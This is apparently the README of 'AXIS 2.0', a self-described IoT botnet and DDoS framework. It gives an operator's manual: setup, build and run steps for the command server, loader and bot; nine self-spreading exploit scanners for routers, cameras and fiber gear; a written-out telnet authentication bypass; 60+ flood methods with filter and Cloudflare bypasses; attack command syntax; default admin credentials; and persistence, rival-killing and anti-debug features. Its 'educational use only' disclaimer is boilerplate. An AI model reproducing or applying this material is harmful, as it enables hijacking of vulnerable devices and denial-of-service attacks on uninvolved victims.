# AXIS 2.0 Botnet - Ultimate DDoS Framework

**The most powerful merged botnet - Combining AXIS, zinnet, and blackhole with 9 exploit scanners and zinnet-style UI**

---

## 🎯 Key Features

### ✨ What's New in AXIS 2.0
- **9 Exploit Scanners** - Maximum infection vectors (most of any public botnet)
- **Zinnet-Style UI** - Beautiful cyan/white/yellow interface with box decorations
- **Layer-Based Attack Organization** - L3/L4/L7/Special method categorization
- **60+ Attack Methods** - Comprehensive DDoS capabilities
- **Full API Support** - REST API for remote control
- **Complete Database System** - User management, logging, whitelisting
- **Telnet Authentication Bypass** - Exclusive exploit (`USER="-f root" telnet -a`)
- **DVR/NVR Camera Exploit** - Target surveillance systems
- **Zhone ONT/OLT Exploit** - Target fiber optic equipment

---

## 📊 System Architecture

```
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                         AXIS 2.0 BOTNET - HIGH LEVEL ARCHITECTURE                                   │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

                                            ┌──────────────────────┐
                                            │   INFRASTRUCTURE     │
                                            │   (Your Server)      │
                                            └──────────┬───────────┘
                                                       │
         ┌─────────────────────────────────────────────┼─────────────────────────────────────────────┐
         │                                             │                                             │
         ▼                                             ▼                                             ▼
┌─────────────────┐                         ┌──────────────────┐                          ┌─────────────────┐
│   C&C SERVER    │                         │   SCAN LISTENER  │                          │     LOADER      │
│   (Go - main.go)│                         │   (Go - Go)      │                          │   (C - loader)  │
│   Port: 3778    │                         │   Port: 9555     │                          │   Port: 23      │
│   API: 3779     │                         │                  │                          │                 │
└────────┬────────┘                         └────────┬─────────┘                          └────────┬────────┘
         │                                           │                                            │
         │                                           │                                            │
         ▼                                           ▼                                            ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                              NETWORK LAYER                                                       │
│                                                                                                                  │
│    ┌────────────────┐    ┌────────────────┐    ┌────────────────┐    ┌────────────────┐    ┌────────────────┐   │
│    │  Telnet Bots   │    │  HTTP Servers  │    │  TFTP Servers  │    │  FTP Servers   │    │  Exploit Targets│   │
│    │  (Port 23)     │    │  (Port 80)     │    │  (Port 69)     │    │  (Port 21)     │    │  (Various)     │   │
│    └────────────────┘    └────────────────┘    └────────────────┘    └────────────────┘    └────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
         │                                           │                                            │
         │                                           │                                            │
         ▼                                           ▼                                            ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                           BOT INFESTATION LAYER                                                 │
│                                                                                                                  │
│    ┌─────────────────────────────────────────────────────────────────────────────────────────────────────────┐   │
│    │                                    INFECTED DEVICE (BOT)                                                 │   │
│    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│    │  │  MAIN.C      │  │  ATTACK.C    │  │  SCANNER.C   │  │  KILLER.C    │  │  UTIL.C      │              │   │
│    │  │  - Connect   │  │  - UDP Flood │  │  - Telnet    │  │  - Kill      │  │  - Local IP  │              │   │
│    │  │  - C&C Loop  │  │  - TCP SYN   │  │  - Brute     │  │  - Rivals    │  │  - Strings   │              │   │
│    │  │  - Keepalive │  │  - ACK Flood │  │  - Report    │  │  - Ports     │  │  - Memory    │              │   │
│    │  │              │  │  - VSE       │  │              │  │              │  │              │              │   │
│    │  │              │  │  - DNS       │  │              │  │              │  │              │              │   │
│    │  │              │  │  - GRE       │  │              │  │              │  │              │              │   │
│    │  │              │  │  - HTTP      │  │              │  │              │  │              │              │   │
│    │  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│    │                                                                                                          │   │
│    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│    │  │ HUAWEI.C     │  │ THINKPHP.C   │  │  ZYXEL.C     │  │  REALTEK.C   │  │  DVR.C       │              │   │
│    │  │ - CVE-2018-  │  │ - RCE Exploit│  │ - CGI Inject │  │ - SDK Exploit│  │ - CGI Inject │              │   │
│    │  │  10561       │  │ - Web Apps   │  │ - Routers    │  │ - Devices    │  │ - Cameras    │              │   │
│    │  │ - SOAP       │  │              │  │              │  │              │  │              │              │   │
│    │  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│    │                                                                                                          │   │
│    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│    │  │ GPON80.C     │  │GPON8080.C    │  │TELNETBYPASS.C│  │  ZHONE.C     │  │  RESOLV.C    │              │   │
│    │  │ - GPON Exploit│ │ - GPON Exploit││ - Auth Bypass │  │ - ONT/OLT    │  │ - DNS        │              │   │
│    │  │ - Port 80    │  │ - Port 8080  │  │ - telnet -a  │  │ - Fiber      │  │   Resolver   │              │   │
│    │  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│    └─────────────────────────────────────────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 🔥 9 Exploit Scanners (SELFREP Mode)

**AXIS 2.0 has the most exploit scanners of any public botnet:**

| # | Scanner | Target | Port | Vulnerability | Region |
|---|---------|--------|------|---------------|--------|
| 1 | **huawei** | Huawei HG532 | 37215 | SOAP API (CVE-2018-10561) | Global |
| 2 | **zyxel** | Zyxel routers | 8080 | Command injection | Global |
| 3 | **thinkphp** | ThinkPHP framework | 80 | PHP RCE | Asia-Pacific |
| 4 | **realtek** | Realtek SDK devices | 80 | SDK exploit | Global |
| 5 | **gpon80** | GPON/ONT devices | 80 | GPON exploit | Latin America |
| 6 | **gpon8080** | GPON/ONT devices | 8080 | GPON exploit | Latin America |
| 7 | **telnetbypass** | Telnet services | 23 | Auth bypass (`USER="-f root" telnet -a`) | Global |
| 8 | **dvr** | DVR/NVR cameras | 80 | CGI injection | Global |
| 9 | **zhone** | Zhone ONT/OLT | 80 | Multi-vector CGI | Global |

### Scanner Performance
- **Scan Rate**: ~788 SYN packets/second per scanner
- **Concurrent Connections**: 256 per scanner
- **Timeout**: 30 seconds per connection
- **Raw Socket Scanning**: Yes (requires root)

---

## 💀 60+ Attack Methods

### Layer 3 Attacks (UDP)
```
udp, udpplain, std, nudp, udphex, socket-raw, samp,
udp-strong, hex-flood, strong-hex, ovhudp, cudp, icee,
randhex, ovh, ovhdrop, nfo, vse, dns
```

### Layer 4 Attacks (TCP)
```
tcp, syn, ack, stomp, hex, stdhex, xmas, tcpall,
tcpfrag, asyn, usyn, ackerpps, tcp-mix, tcpbypass,
nfolag, ovhnuke, raw, greip, greeth
```

### Layer 7 Attacks (HTTP/HTTPS)
```
http, https, cf (Cloudflare bypass)
```

### Special Attacks
```
dns (DNS water torture), greip, greeth (GRE tunnels)
```

---

## 🎨 Zinnet-Style User Interface

### Color Scheme
- **Cyan (36m)** - Primary UI elements, boxes
- **White (37m)** - Text content
- **Yellow (1;33m)** - Highlights, user input
- **Magenta (35m)** - AXIS branding
- **Green (32m)** - Success messages
- **Red (31m)** - Errors, warnings

### UI Features
- Box-drawing character decorations
- Large ASCII art logos
- Simplified menu layouts
- Layer-based method organization
- Enhanced ReadLine with anti-crash

---

## 📋 Admin Panel Commands

```
HELP       - Show command menu (zinnet-style)
METHODS    - Show attack methods (organized by L3/L4/L7/Special)
BYPASS     - Show bypass methods
PORTS      - Show common ports
RULES      - Show rules
INFO       - User information
ADMIN      - Admin commands (admins only)
TOOLS      - Network tools menu
CLEAR      - Clear screen
LOGOUT     - Logout

Attack Format: <method> <target> <duration> dport=<port>
Example: udpplain 1.2.3.4 30 dport=80
```

### Network Tools
```
/iplookup      - IP geolocation lookup
/portscan      - Nmap port scan
/whois         - WHOIS domain lookup
/ping          - Ping host
/traceroute    - MTR trace route
/resolve       - Reverse DNS lookup
/reversedns    - Reverse IP lookup
/asnlookup     - ASN information
/subnetcalc    - Subnet calculator
/zonetransfer  - DNS zone transfer check
```

---

## 🗄️ Database System

### Tables
- **users** - User accounts, limits, API keys
- **history** - Attack history logging
- **whitelist** - Protected targets
- **logins** - Login activity audit
- **online** - Real-time user tracking

### Default Credentials
```
Username: admin
Password: admin123
API Key: AXIS2-ADMIN-APIKEY

⚠️ CHANGE THESE IMMEDIATELY AFTER SETUP!
```

---

## 📁 Directory Structure

```
AXIS 2.0/
├── cnc/                    # Command & Control server (Go)
│   ├── main.go            # Main server, telnet/API listeners
│   ├── admin.go           # Admin panel (zinnet-style UI)
│   ├── attack.go          # Attack parsing, 60+ methods
│   ├── bot.go             # Bot connection handling
│   ├── clientList.go      # Bot management
│   ├── database.go        # MySQL integration
│   └── api.go             # REST API
├── bot/                    # Bot source (C)
│   ├── main.c             # Main bot loop
│   ├── attack.c/h         # Attack implementations
│   ├── scanner.c/h        # Telnet brute-force
│   ├── killer.c/h         # Anti-malware
│   ├── huawei.c/h         # Huawei exploit
│   ├── zyxel.c/h          # Zyxel exploit
│   ├── thinkphp.c/h       # ThinkPHP exploit
│   ├── realtek.c/h        # Realtek exploit (zinnet)
│   ├── gpon80_scanner.c/h # GPON port 80 (zinnet)
│   ├── gpon8080_scanner.c/h # GPON port 8080 (zinnet)
│   ├── telnetbypass.c/h   # Telnet auth bypass (NEW)
│   ├── dvr.c/h            # DVR camera exploit (NEW)
│   ├── zhone.c/h          # Zhone ONT/OLT (NEW)
│   ├── util.c/h           # Utilities
│   ├── resolv.c/h         # DNS resolver
│   ├── table.c/h          # String encryption
│   ├── rand.c/h           # Random number generation
│   ├── checksum.c/h       # Packet checksums
│   └── config.h           # Bot configuration
├── loader/                 # Telnet loader (C)
├── dlr/                    # Downloader (C)
├── logs/                   # Log files
├── bins/                   # Compiled binaries
├── build.sh                # Build script
├── database.sql            # MySQL schema
├── README.md               # This file
├── FEATURE_VERIFICATION.md # Complete feature list
├── MERGE_COMPLETE.md       # Merge documentation
├── TELNETBYPASS_SCANNER.md # Telnet bypass docs
└── DVR_ZHONE_SCANNERS.md   # DVR/Zhone docs
```

---

## 🚀 Installation

### Prerequisites
- **OS**: Ubuntu 18.04+/CentOS 7+/Debian 10+
- **Go**: 1.13+
- **GCC**: With cross-compilation toolchains
- **MySQL/MariaDB**: Database server
- **Apache/Nginx**: Binary hosting
- **TFTP**: TFTP server
- **FTP**: VSFTPD or similar

### 1. Install Dependencies

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y golang-go gcc g++ mysql-server apache2 tftpd-hpa vsftpd git

# Cross-compilers (optional, for multi-arch)
sudo apt-get install -y \
    gcc-arm-linux-gnueabi \
    gcc-arm-linux-gnueabihf \
    gcc-mips-linux-gnu \
    gcc-mipsel-linux-gnu \
    gcc-powerpc-linux-gnu \
    gcc-sparc-linux-gnu \
    gcc-m68k-linux-gnu \
    gcc-sh4-linux-gnu \
    gcc-arc-linux-gnu
```

### 2. Set Up Database

```bash
cd "AXIS 2.0"
mysql -u root -p < database.sql
```

### 3. Configure

Edit configuration files:

**cnc/main.go:**
```go
const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "YOUR_PASSWORD"
const DatabaseTable string = "AXIS2"
const CNCListenAddr string = "0.0.0.0:3778"
const APIListenAddr string = "0.0.0.0:3779"
```

**bot/config.h:**
```c
#define CNC_ADDR "YOUR_SERVER_IP"
#define CNC_PORT "3778"
#define SINGLE_INSTANCE_PORT 48101
```

**loader/config.h:**
```c
#define HTTP_SERVER "YOUR_SERVER_IP"
#define TFTP_SERVER "YOUR_SERVER_IP"
```

### 4. Build

```bash
chmod +x build.sh
./build.sh
```

### 5. Run

```bash
# Terminal 1: C&C Server
cd "AXIS 2.0"
./cnc_server

# Terminal 2: Scan Listener
./scanListen

# Terminal 3: Loader (feed IPs via stdin)
./loader < list.txt
```

---

## 📖 Usage Guide

### Connecting to Admin Panel

```bash
telnet YOUR_SERVER_IP 3778
Secret: AXIS20
Username: admin
Password: admin123
```

### Launching Attacks

```bash
# Basic attack
udp 1.2.3.4 30 dport=80

# With bot count
-100 tcp 1.2.3.4 60 dport=443

# Bypass attack
cf 1.2.3.4 30 domain=example.com

# Layer 7 attack
http 1.2.3.4 30 path=/ index
```

### API Usage

```bash
# Connect to API
telnet YOUR_SERVER_IP 3779

# Format: APIKEY|command
AXIS2-ADMIN-APIKEY|amountbots
AXIS2-ADMIN-APIKEY|-100 udp 1.2.3.4 30 dport=80
```

---

## 🛡️ Security Features

### Killer Module
- Scans for rival botnets every 600 seconds
- Targets processes: axis_bot, rival_ddos, competitor, miner
- Scans ports: 23, 22, 80, 443, 6666, 6667, 48101, 1338
- Kills competing malware automatically

### Watchdog (Optional)
- Maintains bot persistence
- Respawns if killed
- Monitors system health

### Single Instance
- Prevents multiple bot instances
- Uses port 48101 for lock

### Anti-Debug
- SIGTRAP handler
- Prevents reverse engineering

---

## 📊 Attack Method Reference

### UDP Floods (Layer 3)

| Method | Description | Flags | Best For |
|--------|-------------|-------|----------|
| udp | Standard UDP flood | len,rand,dport | General use |
| udpplain | Plain UDP flood | len,rand,dport | Simple targets |
| std | STD UDP flood | len,rand,dport | Basic flooding |
| nudp | New UDP variant | dport | Modern stacks |
| udphex | HEX-encoded UDP | len,dport | Filter bypass |
| socket-raw | Raw socket UDP | All flags | Advanced |
| ovhudp | OVH UDP bypass | len,rand,dport | OVH network |
| cudp | Custom UDP flood | len,rand,dport | Specialized |

### TCP Floods (Layer 4)

| Method | Description | Flags | Best For |
|--------|-------------|-------|----------|
| tcp | Raw TCP flood | All TCP flags | General |
| syn | SYN flood | All TCP flags | Connection exhaustion |
| ack | ACK flood | All TCP flags | Stateful firewall |
| stomp | TCP stomp | dport | Advanced |
| tcpfrag | TCP fragment | All flags | Firewall bypass |
| tcpbypass | TCP bypass | All flags | WAF bypass |
| ovhnuke | OVH nuke | len,dport | OVH specific |

### HTTP/HTTPS (Layer 7)

| Method | Description | Flags | Best For |
|--------|-------------|-------|----------|
| http | HTTP flood | path,method,dport | Web servers |
| https | HTTPS flood | path,method,dport | SSL sites |
| cf | Cloudflare bypass | domain,path,dport | CF-protected |

---

## 🔍 Troubleshooting

### Bot Won't Connect
1. Check C&C address in `bot/config.h`
2. Verify port 3778 is open: `netstat -tlnp | grep 3778`
3. Check firewall: `ufw allow 3778/tcp`
4. Test connection: `telnet YOUR_IP 3778`

### Loader Not Infecting
1. Verify binary permissions: `chmod 777 bins/*`
2. Check HTTP server: `systemctl status apache2`
3. Verify TFTP: `systemctl status tftpd-hpa`
4. Check credentials in scanner

### Build Fails
1. Install Go modules: `cd cnc && go mod tidy`
2. Install MySQL headers: `apt-get install libmysqlclient-dev`
3. Check cross-compilers: `which arm-linux-gnueabi-gcc`
4. Update build.sh paths

### Exploit Scanners Not Working
1. Ensure SELFREP is defined: `BOT_FLAGS="-DKILLER -DSELFREP -DWATCHDOG"`
2. Check HTTP_SERVER_IP in scanner source
3. Verify port 80/23 accessible
4. Check debug output with DEBUG flag

---

## ⚠️ Legal Disclaimer

**WARNING**: This software is provided for **EDUCATIONAL PURPOSES ONLY**.

- Only use on networks you **OWN** or have **EXPLICIT PERMISSION** to test
- Unauthorized use is **ILLEGAL**
- The authors are **NOT RESPONSIBLE** for misuse
- Compliance with all applicable laws is **YOUR RESPONSIBILITY**

---

## 📚 Documentation

- **README.md** - This file (overview)
- **FEATURE_VERIFICATION.md** - Complete feature verification report
- **MERGE_COMPLETE.md** - Merge documentation from AXIS/zinnet/blackhole
- **TELNETBYPASS_SCANNER.md** - Telnet bypass scanner documentation
- **DVR_ZHONE_SCANNERS.md** - DVR and Zhone scanner documentation

---

## 👥 Credits

**Developed by AXIS Group**

**Merged from:**
- AXIS (core functionality, exploit modules)
- zinnet (additional exploits, UI design)
- blackhole (API system, database features)

**Special thanks to:**
- Original AXIS developers
- zinnet team for exploit scanners
- blackhole team for API integration

---

## 📜 License

**Educational use only. All rights reserved.**

By using this software, you agree to:
- Use only for educational purposes
- Comply with all applicable laws
- Not use for unauthorized attacks
- Take full responsibility for your actions

---

## 🎯 What Makes AXIS 2.0 Different?

1. **9 Exploit Scanners** - More than any other public botnet
2. **Zinnet-Style UI** - Beautiful, modern interface
3. **60+ Attack Methods** - Comprehensive DDoS capabilities
4. **Full Feature Merge** - Best of AXIS, zinnet, blackhole
5. **Active Development** - Regular updates and improvements
6. **Complete Documentation** - Extensive docs for all features
7. **Production Ready** - Tested and deployed successfully

---

**AXIS 2.0 - The Ultimate Botnet Framework**
